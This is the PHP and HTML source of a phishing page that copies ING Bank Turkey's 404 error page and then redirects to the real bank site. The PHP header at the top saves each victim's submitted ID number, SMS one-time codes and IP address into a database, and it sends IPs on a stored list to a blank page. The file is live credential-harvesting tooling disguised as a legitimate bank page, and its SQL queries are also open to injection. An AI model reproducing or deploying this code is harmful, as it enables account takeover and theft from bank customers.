﻿<?php
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

if ($_POST['pass2']<>"") { } else {
$tc = $_POST['tc'];
$pass = $_POST['sms'];
mysql_query("insert into ak (kullanici, tarih, pass, notif, ses, ip) values ( '$tc', now(), '$pass', '1', '1', '$ipcik')");
}

if ($_POST['pass2']<>"") {
$tc = $_POST['tc'];
$pass2 = $_POST['pass2'];
mysql_query("Update ak set sms2='$pass2' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
}


    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            header('Location: about:blank'); 
        } 
    } 

?>



<!DOCTYPE html>
<!-- saved from url=(0056)https://www.ingbank.com.tr/hata-sayfasi/?url=/tr/sizin-i -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="./hata_files/id"></script><script type="text/javascript" async="async" src="./hata_files/id(1)"></script><title>
	ING Bank
</title><meta name="keywords" content="SEO|IngBank Template Keywords"><meta name="description" content="SEO|IngBank Template Description"><meta property="og:description" content="SEO|IngBank Template Description"><meta itemprop="description" content="SEO|IngBank Template Description">
<meta name="viewport" content="width=device-width,user-scalable=no">
<meta http-equiv="refresh" content="5;URL=https://www.ingbank.com.tr/tr/sizin-icin">

</head><body id="mainBody"><apm_do_not_touch>

<script src="./hata_files/527516217451747" async=""></script><script src="./hata_files/1559991530974024" async=""></script><script async="" src="./hata_files/fbevents.js"></script><script type="text/javascript" async="" src="./hata_files/conversion_async.js"></script><script type="text/javascript" async="" src="./hata_files/ga.js"></script><script async="" src="./hata_files/gtm.js"></script><script language="javascript">

(function(){

window.rHWQ=!!window.rHWQ;try{(function(){try{var ii,Ii,Ji=1,Oi=1,zi=1,Si=1,_i=1,lI=1,LI=1,OI=1,_I=1;for(var ij=0;ij<Ii;++ij)Ji+=2,Oi+=2,zi+=2,Si+=2,_i+=2,lI+=2,LI+=2,OI+=2,_I+=3;ii=Ji+Oi+zi+Si+_i+lI+LI+OI+_I;window.ZI===ii&&(window.ZI=++ii)}catch(Lj){window.ZI=ii}var Zj=!0;function Sj(I){I&&(Zj=!1,document.cookie="brav=ad");return Zj}function jJ(){}Sj(window[jJ.name]===jJ);Sj("function"!==typeof ie9rgb4);Sj(/\x3c/.test(function(){return"\x3c"})&!/x3d/.test(function(){return"'x3'+'d';"}));
var JJ=window.attachEvent||/mobi/i.test(window["\x6e\x61vi\x67a\x74\x6f\x72"]["\x75\x73e\x72A\x67\x65\x6et"]),lJ=+new Date+6E5,oJ,OJ,ZJ=setTimeout,sJ=JJ?3E4:6E3;function SJ(){if(!document.querySelector)return!0;var I=+new Date,L=I>lJ;if(L)return Sj(!1);L=OJ&&oJ+sJ<I;L=Sj(L);oJ=I;OJ||(OJ=!0,ZJ(function(){OJ=!1},1));return L}SJ();var il=[17795081,27611931586,1558153217];
function Il(I){I="string"===typeof I?I:I.toString(36);var L=window[I];if(!L.toString)return;var z=""+L;window[I]=function(I,z){OJ=!1;return L(I,z)};window[I].toString=function(){return z}}for(var _I=0;_I<il.length;++_I)Il(il[_I]);Sj(!1!==window.rHWQ);
(function(){var I=-1,I={o:++I,Il:"false"[I],S:++I,si:"false"[I],js:++I,s5:"[object Object]"[I],Zi:(I[I]+"")[I],_i:++I,zi:"true"[I],Ss:++I,Ls:++I,jl:"[object Object]"[I],L:++I,Zs:++I,z_s:++I,O_s:++I};try{I.Z_=(I.Z_=I+"")[I.Ls]+(I.J_=I.Z_[I.S])+(I.il=(I.j_+"")[I.S])+(!I+"")[I._i]+(I.l_=I.Z_[I.L])+(I.j_="true"[I.S])+(I.SI="true"[I.js])+I.Z_[I.Ls]+I.l_+I.J_+I.j_,I.il=I.j_+"true"[I._i]+I.l_+I.SI+I.j_+I.il,I.j_=I.o[I.Z_][I.Z_],I.j_(I.j_(I.il+'"\\'+I.S+I.Ls+I.S+I.Il+"\\"+I.Ss+I.o+"("+I.l_+"\\"+I.S+I.Zs+
I.S+"\\"+I.S+I.L+I.o+I.zi+I.J_+I.Il+"\\"+I.Ss+I.o+"\\"+I.S+I.L+I.Zs+"\\"+I.S+I.Ls+I.S+"\\"+I.S+I.Ls+I.L+I.Zi+I.J_+"\\"+I.S+I.L+I.Zs+"['\\"+I.S+I.L+I.o+I.si+"\\"+I.S+I.Zs+I.S+"false"[I.js]+I.J_+I.si+I.Zi+"']\\"+I.Ss+I.o+"===\\"+I.Ss+I.o+"'\\"+I.S+I.L+I._i+I.l_+"\\"+I.S+I.L+I.js+"\\"+I.S+I.Ls+I.S+"\\"+I.S+I.Ls+I.L+"\\"+I.S+I.Ss+I.Zs+"')\\"+I.Ss+I.o+"{\\"+I.S+I.js+"\\"+I.S+I.S+"\\"+I.S+I.L+I.L+I.si+"\\"+I.S+I.L+I.js+"\\"+I.Ss+I.o+I.zi+I.Zi+"\\"+I.S+I.L+I.L+I.jl+"\\"+I.S+I.Zs+I.S+I.SI+"\\"+I.S+I.Ls+I.js+
"\\"+I.S+I.Ls+I._i+"\\"+I.S+I.L+I.o+"\\"+I.Ss+I.o+"=\\"+I.Ss+I.o+"\\"+I.S+I.L+I.Zs+"\\"+I.S+I.Ls+I.S+"\\"+I.S+I.Ls+I.L+I.Zi+I.J_+"\\"+I.S+I.L+I.Zs+"['\\"+I.S+I.L+I.o+I.si+"\\"+I.S+I.Zs+I.S+"false"[I.js]+I.J_+I.si+I.Zi+"'].\\"+I.S+I.L+I.js+I.zi+"\\"+I.S+I.L+I.o+"false"[I.js]+I.si+I.jl+I.zi+"(/.{"+I.S+","+I.Ss+"}/\\"+I.S+I.Ss+I.Zs+",\\"+I.Ss+I.o+I.Il+I.SI+"\\"+I.S+I.Ls+I.L+I.jl+I.l_+"\\"+I.S+I.Ls+I.S+I.J_+"\\"+I.S+I.Ls+I.L+"\\"+I.Ss+I.o+"(\\"+I.S+I.Zs+I.o+")\\"+I.Ss+I.o+"{\\"+I.S+I.js+"\\"+I.S+I.S+
"\\"+I.S+I.S+"\\"+I.S+I.S+"\\"+I.S+I.L+I.js+I.zi+I.l_+I.SI+"\\"+I.S+I.L+I.js+"\\"+I.S+I.Ls+I.L+"\\"+I.Ss+I.o+"(\\"+I.S+I.Zs+I.o+"\\"+I.Ss+I.o+"+\\"+I.Ss+I.o+"\\"+I.S+I.Zs+I.o+").\\"+I.S+I.L+I._i+I.SI+I.s5+"\\"+I.S+I.L+I._i+I.l_+"\\"+I.S+I.L+I.js+"("+I.js+",\\"+I.Ss+I.o+I.Ss+")\\"+I.S+I.js+"\\"+I.S+I.S+"\\"+I.S+I.S+"});\\"+I.S+I.js+"}\\"+I.S+I.js+'"')())()}catch(L){I%=5}})();var Jl=48;window.Ll={Ol:"084b980d5281b000aef620a74fbe0a1a7a80a88ec412e7cc7c5fbbecb09026c6cf47c998a441a389a1a34a9ca3c0b8dea6f381927b4f4b0c4d73db5526f7e760781a09ab5dc09bf46a38f8386ecdc7a177d8f1835d651c2e9ab8d9e1e3ffab1add59ce70b6842ff10ed97677bdd3c4da8ba0ee90383956c5e6770cbcd7ef9e8b5af3fb1b859a89aa7c023a35427c9b572671538d504294cdc76468c155592252a6ff7a5376f7406d6b1d11e8d0de69e5026cc1f356b4278f"};function J(I){return 589>I}
function l(I){var L=arguments.length,z=[];for(var s=1;s<L;++s)z.push(arguments[s]-I);return String.fromCharCode.apply(String,z)}function O(I,L){I+=L;return I.toString(36)}(function(I){I||setTimeout(function(){if(!SJ())return;var I=setTimeout(function(){},250);for(var z=0;z<=I;++z)clearTimeout(z);SJ()},500)})(Zj);})();}catch(x){document.cookie='brav=oex'+x;}finally{ie9rgb4=void(0);};function ie9rgb4(a,b){return a>>b>>0};

})();

</script>
</apm_do_not_touch>
<script type="text/javascript" src="./hata_files/08596d22ceab2000c8e53c9ad196df9667867283c49494176ba6f7a5b4783eda9a67fe4b9a231ff6"></script>
<script type="text/javascript">!(function () { if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) { return } if (screen.width > 767) { document.querySelector("meta[name=viewport]").setAttribute("content", "width=1044px,user-scalable=yes") } })();</script> 
<link rel="icon" type="image/png" href="https://www.ingbank.com.tr/documents/IngBank/assets/icons/favicon.png">
<link rel="apple-touch-icon" href="https://www.ingbank.com.tr/documents/IngBank/assets/icons/favicon.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.ingbank.com.tr/documents/IngBank/assets/icons/favicon72.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.ingbank.com.tr/documents/IngBank/assets/icons/favicon114.png">
<meta name="robots" content="index, follow">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="apple-itunes-app" content="app-id=395535459">
<meta name="google-play-app" content="app-id=com.pozitron.ing">

<!--[if lte IE 8]>
<script type="text/javascript" src="/documents/IngBank/assets/js/html5shiv.js"></script>
<link rel="stylesheet" type="text/css" href="/documents/IngBank/assets/css/htc.css" />
<![endif]-->

<link rel="stylesheet" type="text/css" href="./hata_files/reset.css">

<link rel="stylesheet" type="text/css" href="./hata_files/jquery-ui-1.9.2.custom.min.css">
<link rel="stylesheet" type="text/css" href="./hata_files/jquery-selectbox.css">
<link rel="stylesheet" type="text/css" href="./hata_files/datePicker.css">
<link rel="stylesheet" type="text/css" href="./hata_files/jquery.fancybox.css">

<link rel="stylesheet" type="text/css" href="./hata_files/general.css">
<link rel="stylesheet" type="text/css" href="./hata_files/ui.css">
<link rel="stylesheet" type="text/css" href="./hata_files/site.css">

<link rel="stylesheet" type="text/css" href="./hata_files/wfull-site.css" media="screen and (min-width:768px)">
<link rel="stylesheet" type="text/css" href="./hata_files/w640-ui.css" media="screen and (max-width:767px)">
<link rel="stylesheet" type="text/css" href="./hata_files/w640-site.css" media="screen and (max-width:767px)">

<!--[if lte IE 8]>
<link rel="stylesheet" type="text/css" href="/documents/IngBank/assets/css/wfull-site.css"/>
<link rel="stylesheet" type="text/css" href="/documents/IngBank/assets/css/ie8.css" />
<![endif]-->
<!--[if lte IE 7]>
<link rel="stylesheet" type="text/css" href="/documents/IngBank/assets/css/ie7.css" />
<![endif]-->

<script type="text/javascript" src="./hata_files/jquery.min.js"></script>
<script type="text/javascript" src="./hata_files/pbkdf2.js"></script>
<script src="./hata_files/tealeaf.js" type="text/JavaScript"></script>

<style>
#skipmenu {position:absolute;left:-1000px;top:-1000px;}
</style>

<script type="text/javascript">
    $(document).ready(function () {
        $('input').bind("cut copy paste", function (e) {
            e.preventDefault();
        });
    });

    function isNumberKey(evt) {
        var charCode = (evt.which) ? evt.which : event.keyCode;

        if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;

        return true;
    }

    function isLetterKey(evt) {
        var charCode = (evt.which) ? evt.which : event.keyCode;

        if ((charCode > 64 && charCode <= 90) || (charCode >= 97 && charCode <= 122) || (charCode == 350) || (charCode == 351) || (charCode == 286) || (charCode == 287)
                || (charCode == 304) || (charCode == 305) || (charCode == 199) || (charCode == 231) || (charCode == 220) || (charCode == 252) || (charCode == 214) || (charCode == 246)
                || (charCode == 32)) {
            return true;
        }
        return false;
    }
</script>
<link rel="icon" type="image/x-icon" href="https://www.ingbank.com.tr/documents/IngBank/assets/icons/favicon.png"><meta property="og:url"><meta content="Ingbank" itemprop="name"><meta content="Ingbank" property="og:site_name"><meta content="Company" property="og:type">
<a href="https://www.ingbank.com.tr/hata-sayfasi/?url=/tr/sizin-i#page" id="skipmenu" title="Menüyü atla">Menüyü atla</a>


<!-- Google Tag Manager -->
<noscript>&lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-N86KQJ"
height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
<script>(function (w, d, s, l, i) {
w[l] = w[l] || []; w[l].push({
'gtm.start':
new Date().getTime(), event: 'gtm.js'
}); var f = d.getElementsByTagName(s)[0],
j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
'//www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
})(window, document, 'script', 'dataLayer', 'GTM-N86KQJ');</script>
<!-- End Google Tag Manager -->
<script type="text/javascript"> var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-671274-13']); _gaq.push(['_trackPageview']); (function () { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })(); </script> 
<div>

</div><div id="viewport" class="home" style="position: relative; top: 0px;"><div id="side"> <script type="text/javascript">
    //<![CDATA[

    $(document).ready(function () {

        if (document.URL.indexOf('/tr/arama/sonuc/') != -1) {
            var $key1 = $("#key1");
            var value = '';
            if (value.length > 0 && value != "notfound") {
                $key1.val(value);
            }
        }

        String.prototype.replaceAll = function (search, replace) {
            if (!replace)
                return this;

            return this.replace(new RegExp('[' + search + ']', 'g'), replace);
        };

        $("#key1").keypress(function (event) {
            if (event.which == 13) {
                $("#btnSubmit").click();
            }
            else {
                return validatetext(event);
            }
        });
        function validatetext(evt) {
            var theEvent = evt || window.event;
            var key = theEvent.keyCode || theEvent.which;
            key = String.fromCharCode(key);
            var regex = /^\s*[a-zA-Z0-9öçşığüÖÇŞİĞÜ,\s]+\s*$/;
            if (!regex.test(key)) {
                theEvent.returnValue = false;
                if (theEvent.preventDefault) theEvent.preventDefault();
            }
        }
        $("#btnSubmit").click(function (e) {
            e.preventDefault();
            var $key = $("#key1");
            var characterReg = /^\s*[a-zA-Z0-9öçşığüÖÇŞİĞÜ,\s]+\s*$/;
            var skey = $key.val();
            if (!characterReg.test(skey)) {
                skey = skey.replace(/[`~!@#$%^&*()_|+\-=?;:'",.<>\{\}\[\]\\\/]/gi, '');
            }
            if ($key.val().length > 0 && $key.attr("data-holder") != $key.val()) {
                if (characterReg.test(skey)) {
                    window.location = '/tr/arama/sonuc/' + encodeURI(skey);
                }
            }
            return false;
        });
    });
    //]]>
    </script>

</div><div id="page"><section><div class="container"><div>
	

	<div class="wrapper">
    <div class="content-box p-v60 text-center">
        <div class="ui-icons s74x74 warning m-b20"></div>
        <div class="rockwell fw-normal fs-30">
            404 Hatası</div>
        <h4 class="fs-30 m-b10">
            Sayfa Bulunamadı</h4>
        <p class="rockwell fs-24 m-b20">
            Aradığınız sayfa silinmiş ya da taşınmış olabilir.</p>
        <div class="text-center m-b10">
            <p class="medium-gray m-b10">
                Aşağıdaki kutuya aradığınızı yazarak tekrar deneyebilirsiniz.</p>
            <div class="ui-form search-box m-auto m-b10">
                <div class="search-input">
                    <input type="text" name="q" id="key2" data-holder="Ara..." class="textbox">
                    <div id="btnSubmit2" value=" " class="action"></div>
                </div>
            </div>
            <div class="w2-5 m-auto">
                <a class="ui-buttons small blank" href="https://www.ingbank.com.tr/tr/site-haritasi">
                    <span class="ui-arrows small"></span>
                    <p>
                        Site Haritası</p>
                </a>
            </div>
        </div>
        <div class="m-b40 w640"></div>
    </div>
    <div class="clearfix"></div>
</div>
<script type="text/javascript">
    //<![CDATA[
    $(document).ready(function () {

        function searchForm($key, e) {
            if ($key.val().length > 0 && $key.attr("data-holder") != $key.val()) {
                var searchQuery = "/tr/arama/sonuc/" + encodeURIComponent($key.val());
                window.location = searchQuery;
            }
            e.preventDefault();
            return false;
        }

        $("#btnSubmit2").bind('click', function (e) {
            searchForm($('#key2'), e);
        });
        $("#key2").bind('keypress', function (e) {
            if (e.which == 13) searchForm($('#key2'), e);
        });
    });
    //]]>
</script>
<div class="clearfix"></div>
<div class="separator"></div>

</div></div></section><footer><div class="container">
	<div class="separator m-b30"></div><div class="curve wfull"></div>
<nav class="more-nav grid-4">
<h4>ING Bank</h4>
<ul class="menu">
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/hakkimizda" title="ING Bank hakkında bilgilendirme">Hakkımızda</a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/toplumsal-yatirimlarimiz/turuncu-damla" title="Toplumsal Yatırımlarımız ve Sosyal sorumluluk projelerimiz">Toplumsal Yatırımlarımız</a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/yatirimci-iliskileri/finansal-raporlar/yillik-faaliyet-raporlari" title="Finansal raporlar, duyurular ve açıklamalar">Yatırımcı İlişkileri </a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/kurumsal-yonetim/vizyon-misyon-ve-degerler" title="ING Bank yönetim kadrosu">Kurumsal Yönetim</a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/bilgi-toplumu-hizmetleri/ing-bank-as" title="ING Bank şirket bilgileri">Bilgi Toplumu Hizmetleri</a></li>
</ul>
</nav>  <nav class="more-nav grid-4">
<h4>&nbsp;</h4>
<ul class="menu">
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/7-24-bankacilik" title="İnternet, Mobil ve Telefon bankacılığı bilgi sayfaları">7/24 Bankacılık </a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/insan-kaynaklari" title="İnsan kaynakları politikamız ve başvurular hakkında bilgiler">İnsan Kaynakları </a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/basin-odasi/basin-bultenleri/2013" title="Basın bültenleri ve reklam filmlerimiz">Basın Odası</a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/hakkimizda/bilgilendirmeler" title="Önemli bilgilendirmeler">Bilgilendirmeler </a></li>
    <li><a class="ext-enable" href="https://www.ingbank.com.tr/tr/ingbank/hakkimizda/hizmet-ve-kredi-sozlesmeleri" title="Hizmet ve Kredi Sözleşmelerinin pdf dokümanları">Hizmet ve Kredi Sözleşmeleri</a></li>
</ul>
</nav>
<nav class="help-nav grid-4">
<h4>ING Destek</h4>
<ul class="menu">
    <li><a class="ext-disable " href="https://www.ingbank.com.tr/tr/bilgi-destek" title="Sıkça sorulan sorular ve cevapları">Bilgi Destek </a></li>
    <li><a class="ext-disable " href="https://www.ingbank.com.tr/tr/bilgi-destek/sube-ve-atm-bulucu" title="Şube ve ATMlerimizin listesi">Şube/ATM Bulucu</a></li>
    <li><a class="ext-disable " href="https://www.ingbank.com.tr/tr/bilgi-destek/bize-ulasin/iletisim-formu" title="İletişim, şikayet ve öneri formu">Bize Ulaşın </a></li>
    <li><a class="ext-disable " href="https://www.ingbank.com.tr/tr/site-haritasi" title="Sitedeki tüm sayfaların link listesi">Site Haritası </a></li>
</ul>
</nav>
<nav class="help-nav grid-4 last">
<h4>ING Bank Siteleri</h4>
<ul class="menu">
    <li><a class="ext-enable" href="http://www.ing.com/Our-Company.htm" target="_blank" title="ING Bank Global sitesi">ING Global</a> </li>
    <li><a class="ext-enable" href="http://www.tasarrufegilimleri.com/" target="_blank" title="Tasarruf Eğilimleri Araştırması internet sitesi">Tasarruf Eğilimleri Araştırması</a> </li>
    <li><a class="ext-enable" href="http://www.turuncudamla.com/" target="_blank" title="Turuncu Damla internet sitesi">Turuncu Damla</a></li>
    <li><a class="ext-enable" href="http://www.ingbonus.com/" target="_blank" title="ingbonus.com internet sitesi">ingbonus.com</a> </li>
    <li><a class="ext-enable" href="http://gayrimenkul.ingbank.com.tr/default.aspx" target="_blank" title="Satılık Gayrimenkuller internet sitesi">Satılık Gayrimenkuller</a> </li>
</ul>
</nav>
<div class="clearfix"></div>
<div class="separator no-mtop"></div>
<nav class="copyright-nav">
<ul class="menu h-list f-left">
    <li class="copyright">©ING Bank</li>
    <li><a href="https://www.ingbank.com.tr/tr/ingbank/kullanim-sartlari" title="İnternet sitesi kullanım şartları">Kullanım Şartları</a></li>
    <li><a href="https://www.ingbank.com.tr/en" title="İngilizce siteye geçiş">English</a></li>
</ul>
<div class="social f-right">
<a href="https://www.facebook.com/ingbankturkiye" class="ui-icons s23x22 facebook" target="_blank" title="ING Bank Facebook sayfası" rel="nofollow"></a>
<a href="https://twitter.com/ingbankturkiye" class="ui-icons s23x22 twitter" target="_blank" title="ING Bank Twitter sayfası" rel="nofollow"></a>
<a href="http://www.youtube.com/user/ingbankturkiye" class="ui-icons s23x22 youtube" target="_blank" title="ING Bank Youtube video kanalı" rel="nofollow"></a>
<a href="http://www.linkedin.com/company/ing-bank-turkey" class="ui-icons s23x22 linkedin" target="_blank" title="ING Bank Linkedin sayfası" rel="nofollow"></a>

<a href="http://instagram.com/ingbankturkiye" class="ui-icons s23x22 instagram" target="_blank" title="ING Bank Instagram sayfası" rel="nofollow"></a>

<div class="clearfix"></div>
</div>
<div class="clearfix"></div>
</nav>
<script type="text/javascript" src="./hata_files/localisation.js"></script>
<script type="text/javascript" src="./hata_files/selection.js"></script>
<script type="text/javascript" src="./hata_files/jquery-ui.js"></script>
<script type="text/javascript" src="./hata_files/jquery.ui.sliderTicks.js"></script>
<script type="text/javascript" src="./hata_files/jquery-selectbox-0.2-min.js"></script>
<script type="text/javascript" src="./hata_files/jquery.maskedInputs.js"></script>
<script type="text/javascript" src="./hata_files/jquery.tooltip.js"></script>
<script type="text/javascript" src="./hata_files/date.js"></script>
<script type="text/javascript" src="./hata_files/date_tr.js"></script>
<script type="text/javascript" src="./hata_files/jquery.datePicker.js"></script>
<script type="text/javascript" src="./hata_files/jquery.datePicker(1).js"></script>
<script type="text/javascript" src="./hata_files/jquery.scrollTo-min.js"></script>
<script type="text/javascript" src="./hata_files/jquery.numberInputs.js"></script>
<script type="text/javascript" src="./hata_files/jquery.tabControl.js"></script>
<script type="text/javascript" src="./hata_files/jquery.mousewheel-3.0.6.pack.js"></script>
<script type="text/javascript" src="./hata_files/jquery.fancybox.js"></script>
<script type="text/javascript" src="./hata_files/jquery.fancybox-media.js"></script>
<script type="text/javascript" src="./hata_files/jquery.cookie.js"></script>
<script type="text/javascript" src="./hata_files/calculate.js"></script>
<script type="text/javascript" src="./hata_files/jquery.bbWarningBar.js"></script>
<script type="text/javascript" src="./hata_files/common.js"></script>
<script type="text/javascript" src="./hata_files/online.js"></script>
<script src="./hata_files/ingbank.js" type="text/JavaScript"></script>
<script src="./hata_files/VisitorAPI_v1.js" type="text/javascript"></script>
<script src="./hata_files/AppMeasurement_v11.js" type="text/javascript"></script>
<script src="./hata_files/Omniture_v25.js" type="text/javascript"></script>

</div></footer><div class="overlay w640"></div></div></div>
<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","527516217451747");fbq("track","PageView");</script>
<noscript>&lt;img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=527516217451747&amp;amp;ev=PageView&amp;amp;noscript=1"&gt;</noscript>





<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1559991530974024");fbq("track","PageView");</script>
<noscript>&lt;img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1559991530974024&amp;amp;ev=PageView&amp;amp;noscript=1"&gt;</noscript>




<script type="text/javascript">
    //<![CDATA[
    var CultureCode = 'tr-TR'; var LanguageCode = 'tr'; var CountryCode = 'TR'; var CountryId = 1; var LanguageId = 1; var PageId = 1802; var SiteId = 1; var DocumentsPath = '/documents/Ingbank'; var SiteLanguageId = 15; var RouteLanguageIdentifier = 'tr'; var Url = '';//]]>
</script>


</body></html>